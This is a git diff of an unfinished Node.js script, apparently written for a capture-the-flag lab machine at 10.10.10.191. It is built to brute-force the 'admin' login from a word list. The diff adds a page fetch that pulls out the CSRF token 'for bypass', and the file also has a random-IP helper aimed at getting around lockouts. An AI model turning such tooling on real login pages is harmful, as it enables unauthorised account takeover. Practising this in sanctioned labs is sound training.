@@ -1,10 +1,10 @@
 const http = require('http');
 
-const targetUri = '10.10.10.191';
-const formPath = '/admin';
-const method = 'POST';
-
-
+const host = 'http://10.10.10.191';
+const formPath = '/admin/login/';
+const targetUri = host + formPath;
+const method = 'GET';
+const rx = /input.+?name="tokenCSRF".+?value="(.+?)"/;
 
 const username = 'admin';
 const wordListFilePath = process.argv.slice(2);
@@ -14,15 +14,33 @@ const genRandomIp = () => {
 
 }
 
-const getCSRFToken = () => {
-
+const getCSRFToken = (page) => {
+  console.log('Fetching CSRF Token for bypass');
+  return page.match(rx);
 }
 
 const getPage = () => {
-
+  console.log('Getting page');
+  let rawData = '';
+  const req = http.get(targetUri, (res => {
+    res.on('data', (chunk) => {
+      console.log('Writing chunk');
+      rawData += chunk;
+    });
+    res.on('end', () => {
+      console.log('No more data in response.');
+      try {
+        return getCSRFToken(rawData);
+      } catch (e) {
+        console.error(e.message);
+      }
+    });
+  })).on('error', (e) => {
+    console.error(`Something fucky happened there: ${e.message}`);
+  });
 }
 
-const getWordListEntry = () => {
+  const getWordListEntry = () => {
 
 }
 
@@ -64,7 +82,7 @@ const buildRequest = (entry) => {
 
 const main = () => {
   console.log(`Let's go!`);
-  buildRequest('test');
+getPage();
 }
 
 main();
